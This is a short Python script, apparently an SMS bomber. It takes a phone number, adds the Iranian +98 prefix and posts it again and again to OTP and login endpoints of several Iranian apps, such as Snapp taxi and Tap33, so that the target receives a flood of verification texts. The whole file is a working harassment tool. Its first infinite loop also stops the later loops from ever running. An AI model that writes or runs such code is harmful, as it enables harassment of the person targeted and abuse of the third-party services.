import requests 
import time 

Enter = input("Enter Number : ")

while True:
    url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)
    time.sleep(7)

while True:
    url = "https://tap33.me/api/v2/user"
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)
    time.sleep(7)

while True:
    url = "https://shadmessenger12.iranlms.ir/"
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)
    time.sleep(7)

while True:
    url = "https://web.emtiyaz.app/json/login"
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)
    time.sleep(7)


while True:
    url = "https://messengerg2c4.iranlms.ir/"
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)
    time.sleep(7)